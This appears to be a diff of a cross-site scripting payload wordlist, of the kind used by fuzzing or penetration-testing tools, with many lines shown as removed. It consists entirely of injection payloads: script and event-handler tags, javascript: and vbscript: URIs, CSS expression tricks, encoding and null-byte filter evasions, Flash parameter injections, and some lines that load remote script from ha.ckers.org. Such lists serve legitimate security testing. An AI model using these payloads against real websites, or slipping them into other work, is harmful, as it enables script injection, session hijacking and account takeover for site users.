 <BODY ONLOAD=alert('XSS')>
 <IMG DYNSRC="javascript:alert('XSS')">
 <IMG LOWSRC="javascript:alert('XSS')">
-<BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
 <XSS STYLE="behavior: url(xss.htc);">
 <IMG SRC='vbscript:msgbox("XSS")'>
 ¼script¾alert(¢XSS¢)¼/script¾
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-<TABLE BACKGROUND="javascript:alert('XSS')">
-<TABLE><TD BACKGROUND="javascript:alert('XSS')">
-<DIV STYLE="width: expression(alert('XSS'));">
-<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
-<XSS STYLE="xss:expression(alert('XSS'))">
 exp/*<A STYLE='no\xss:noxss("*//*");
 <!--[if gte IE 4]>
 <SCRIPT>alert('XSS');</SCRIPT>
 <![endif]-->
-<BASE HREF="javascript:alert('XSS');//">
 a="get";
 b="URL(\"";
 c="javascript:";
@@ -3009,197 +1410,74 @@ echo('IPT>alert("XSS")</SCRIPT>'); ?>
 #Twitter.com:
 #Others:
 #GoogleAPI's
-'`"><\x00script>javascript:alert(1)</script>
 \x3Cscript>javascript:alert(1)</script>
 <script>javascript:alert(1)</script\x0D
 <script>javascript:alert(1)</script\x0A
 <script>javascript:alert(1)</script\x0B
-`"'><img src='#\x27 onerror=javascript:alert(1)>
-'`"><\x3Cscript>javascript:alert(1)</script>
-'`"><\x00script>javascript:alert(1)</script>
-"`'><script>\x3Bjavascript:alert(1)</script>
-"`'><script>\x0Djavascript:alert(1)</script>
-"`'><script>\x09javascript:alert(1)</script>
-"`'><script>\x00javascript:alert(1)</script>
-"`'><script>\x0Cjavascript:alert(1)</script>
-"`'><script>\x2Bjavascript:alert(1)</script>
-"`'><script>-javascript:alert(1)</script>
-"`'><script>\x0Ajavascript:alert(1)</script>
-"`'><script>\x7Ejavascript:alert(1)</script>
-"`'><script>\xC2\x85javascript:alert(1)</script>
-"`'><script>\x21javascript:alert(1)</script>
-"`'><script>\x0Bjavascript:alert(1)</script>
-"`'><script>\x20javascript:alert(1)</script>
-"`'><script>\xC2\xA0javascript:alert(1)</script>
-<script\x2F>javascript:alert(1)</script>
-<script\x20>javascript:alert(1)</script>
-<script\x0D>javascript:alert(1)</script>
-<script\x0A>javascript:alert(1)</script>
-<script\x0C>javascript:alert(1)</script>
-<script\x00>javascript:alert(1)</script>
-<script\x09>javascript:alert(1)</script>
-<script>javascript:alert(1)<\x00/script>
-<img src=# onerror\x3D"javascript:alert(1)" >
-<input onfocus=javascript:alert(1) autofocus>
-<video poster=javascript:javascript:alert(1)//
 <frameset onload=javascript:alert(1)>
-<object data="data:text/html;base64,%(base64)s">
-<embed src="data:text/html;base64,%(base64)s">
 <b <script>alert(1)</script>0
 <embed src="javascript:alert(1)">
 <img src="javascript:alert(1)">
 <image src="javascript:alert(1)">
 <script src="javascript:alert(1)">
-<? foo="><script>javascript:alert(1)</script>">
-<! foo="><script>javascript:alert(1)</script>">
-</ foo="><script>javascript:alert(1)</script>">
 <img \x00src=x onerror="alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
-<img \x11src=x onerror="javascript:alert(1)">
-<img \x12src=x onerror="javascript:alert(1)">
-<img\x47src=x onerror="javascript:alert(1)">
-<img\x10src=x onerror="javascript:alert(1)">
-<img\x13src=x onerror="javascript:alert(1)">
-<img\x32src=x onerror="javascript:alert(1)">
-<img\x47src=x onerror="javascript:alert(1)">
-<img\x11src=x onerror="javascript:alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
-<img \x34src=x onerror="javascript:alert(1)">
-<img \x39src=x onerror="javascript:alert(1)">
-<img \x00src=x onerror="javascript:alert(1)">
-<img src\x09=x onerror="javascript:alert(1)">
-<img src\x10=x onerror="javascript:alert(1)">
-<img src\x13=x onerror="javascript:alert(1)">
-<img src\x32=x onerror="javascript:alert(1)">
-<img src\x12=x onerror="javascript:alert(1)">
-<img src\x11=x onerror="javascript:alert(1)">
-<img src\x00=x onerror="javascript:alert(1)">
-<img src\x47=x onerror="javascript:alert(1)">
-<img src=x\x09onerror="javascript:alert(1)">
-<img src=x\x10onerror="javascript:alert(1)">
-<img src=x\x11onerror="javascript:alert(1)">
-<img src=x\x12onerror="javascript:alert(1)">
-<img src=x\x13onerror="javascript:alert(1)">
-<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
-<img src=x onerror=\x09"javascript:alert(1)">
-<img src=x onerror=\x10"javascript:alert(1)">
-<img src=x onerror=\x11"javascript:alert(1)">
-<img src=x onerror=\x12"javascript:alert(1)">
-<img src=x onerror=\x32"javascript:alert(1)">
-<img src=x onerror=\x00"javascript:alert(1)">
-<!--[if]><script>javascript:alert(1)</script -->
 <script src="/\%(jscript)s"></script>
 <script src="\\%(jscript)s"></script>
 <style>*[{}@import'%(css)s?]</style>X
-<div style="font-family:foo}color=red;">XXX
-<// style=x:expression\28javascript:alert(1)\29>
 <div style=content:url(%(svg)s)></div>
 <x style="behavior:url(%(sct)s)">
 <script>%(payload)s</script>
 <script src=%(jscript)s></script>
 <script>javascript:alert(1)</script>
-<IMG SRC="javascript:javascript:alert(1);">
-<IMG SRC=javascript:javascript:alert(1)>
-<IMG SRC=`javascript:javascript:alert(1)`>
 <SCRIPT SRC=%(jscript)s?<B>
 <BODY ONLOAD=javascript:alert(1)>
-<BODY ONLOAD=javascript:javascript:alert(1)>
-<IMG SRC="jav	ascript:javascript:alert(1);">
 <SCRIPT/SRC="%(jscript)s"></SCRIPT>
 <<SCRIPT>%(payload)s//<</SCRIPT>
-<IMG SRC="javascript:javascript:alert(1)"
 <iframe src=%(scriptlet)s <
-<IMG DYNSRC="javascript:javascript:alert(1)">
-<IMG LOWSRC="javascript:javascript:alert(1)">
-<BGSOUND SRC="javascript:javascript:alert(1);">
 <BR SIZE="&{javascript:alert(1)}">
 <LAYER SRC="%(scriptlet)s"></LAYER>
 <STYLE>@import'%(css)s';</STYLE>
 <XSS STYLE="behavior: url(%(htc)s);">
-<XSS STYLE="xss:expression(javascript:alert(1))">
-<BASE HREF="javascript:javascript:alert(1);//">
 <SCRIPT SRC="%(jpg)s"></SCRIPT>
 <STYLE>@import'%(css)s';</STYLE>
 <embed code=%(scriptlet)s></embed>
 <embed src=%(jscript)s></embed>
-<object onerror=javascript:javascript:alert(1)>
-<embed type="image" src=%(scriptlet)s></embed>
 <IMG SRC=&{javascript:alert(1);};>
 '';!--"<XSS>=&{()}
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG SRC=javascript:alert("XSS")>
-<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC=# onmouseover="alert('xxs')">
 <IMG SRC= onmouseover="alert('xxs')">
 <IMG onmouseover="alert('xxs')">
 <IMG SRC="jav	ascript:alert('XSS');">
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
-<IMG SRC="jav&#x0A;ascript:alert('XSS');">
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
-<IMG SRC=" &#14;  javascript:alert('XSS');">
 <<SCRIPT>alert("XSS");//<</SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
 <SCRIPT SRC=//ha.ckers.org/.j>
 <IMG SRC="javascript:alert('XSS')"
-<iframe src=http://ha.ckers.org/scriptlet.html <
 \";alert('XSS');//
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
-<BODY BACKGROUND="javascript:alert('XSS')">
 <IMG DYNSRC="javascript:alert('XSS')">
 <IMG LOWSRC="javascript:alert('XSS')">
 <IMG SRC='vbscript:msgbox("XSS")'>
 <IMG SRC="livescript:[code]">
 <BODY ONLOAD=alert('XSS')>
-xss"><!--><svg/onload=alert(document.domain)>
-<BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
-<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
-<XSS STYLE="xss:expression(alert('XSS'))">
 <XSS STYLE="behavior: url(xss.htc);">
 ¼script¾alert(¢XSS¢)¼/script¾
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-<TABLE BACKGROUND="javascript:alert('XSS')">
-<TABLE><TD BACKGROUND="javascript:alert('XSS')">
-<DIV STYLE="width: expression(alert('XSS'));">
-<BASE HREF="javascript:alert('XSS');//">
 <A HREF="http://66.102.7.147/">XSS</A>
 <A HREF="http://1113982867/">XSS</A>
-<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
-<A HREF="http://0102.0146.0007.00000223/">XSS</A>
-<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
-<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
-<img/src=`%00` onerror=this.onerror=confirm(1) 
-<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
-&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
-<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
-<img/src=@&#32;&#13; onerror = prompt('&#49;')
-<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
 <script ~~~>alert(0%0)</script ~~~>
-<iframe/%00/ src=javaSCRIPT&colon;alert(1)
-<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
-<var onmouseover="prompt(1)">On Mouse Over</var>
-<img src="/" =_=" title="onerror='prompt(1)'">
 <%<!--'%><script>alert(1);</script -->
 <iframe/src \/\/onload = prompt(1)
 <iframe/onreadystatechange=alert(1)
 <svg/onload=alert(1)
-<input value=<><iframe/src=javascript:confirm(1)
-http://www.<script>alert(1)</script .com
 <svg><script ?>alert(1)
 <img src=`xx:xx`onerror=alert(1)>
-<math><a xlink:href="//jsfiddle.net/t846h/">click
-<svg contentScriptType=text/vbs><script>MsgBox+1
 <script>+-+-1-+-+alert(1)</script>
 <body/onload=&lt;!--&gt;&#10alert(1)>
-<img src ?itworksonchrome?\/onerror = alert(1)
-<svg><script onlypossibleinopera:-)> alert(1)
 <script x> alert(1) </script 1=2
-<div/onmouseover='alert(1)'> style="x:">
 <--`<img/src=` onerror=alert(1)> --!>
-<math><a xlink:href="//jsfiddle.net/t846h/">click
 javascript:alert(1)
 <svg/onload=alert(1)>
 <img onload=alert(1)>
@@ -3220,36 +1498,26 @@ alert(1)>
 <svg/onload=alert`INJECTX`>
 <svg/onload=alert(/INJECTX/)>
 <svg/onload=alert(`INJECTX`)>
-<video><source onerror="javascript:alert(1)">//
-<video onerror="javascript:alert(1)"><source>
-<audio onerror="javascript:alert(1)"><source>
 <input autofocus onfocus=alert(1)>
 <select autofocus onfocus=alert(1)>
 <textarea autofocus onfocus=alert(1)>
 <keygen autofocus onfocus=alert(1)>
-<button form=test onformchange=alert(1)>
-<form><button formaction="javascript:alert(1)">
 <svg onload=(alert)(1) >
 <script>$=1,alert($)</script>
-<!--<img src="--><img src=x onerror=alert(1)//">
 <img/src='x'onerror=alert(1)>
 <marguee/onstart=alert(1)>
 <script>alert(1)
 <script>alert(1)<!--INJECTX
-<marquee loop=1 width=0 onfinish=alert(1)>
 #getURL,javascript:alert(1)",
 #goto,javascript:alert(1)",	
 ?javascript:alert(1)",
 ?alert(1)",
 ?getURL(javascript:alert(1))",
-?asfunction:getURL,javascript:alert(1)//",
 ?getURL,javascript:alert(1)",
 ?goto,javascript:alert(1)",		
 ?clickTAG=javascript:alert(1)",
 ?url=javascript:alert(1)",
-?clickTAG=javascript:alert(1)&TargetAS=",
 ?TargetAS=javascript:alert(1)",
-?base=javascript:alert(0)",                
 ?onend=javascript:alert(1)//",
 ?URI=javascript:alert(1)",
 ?callback=javascript:alert(1)",
